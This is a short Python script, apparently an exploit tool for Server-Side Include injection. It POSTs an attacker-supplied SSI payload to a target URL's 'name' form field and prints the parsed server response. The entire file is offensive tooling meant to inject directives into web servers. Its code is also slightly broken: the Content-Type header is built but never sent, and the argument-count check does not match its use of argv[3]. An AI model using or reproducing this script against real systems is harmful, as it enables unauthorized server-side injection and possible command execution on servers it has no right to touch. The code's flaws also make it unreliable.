#!/usr/bin/env python3


from requests import post
from sys import argv
from bs4 import BeautifulSoup

def exploit():
    if len(argv) < 3:
        print("argv[1] -> target => http://0.0.0.0/")
        print("argv[2] -> header => application/???")
        print("argv[3] -> p.data => SSI payload between single quotes")
    else:
        header = {"Content-Type": argv[2]}
        data = {"name": argv[3], "form": "submit"}
        x = post(argv[1], data=data, allow_redirects=True)
        soup = BeautifulSoup(x.text, "xml")
        for tag in soup.find_all():
            print(tag.text)


exploit()
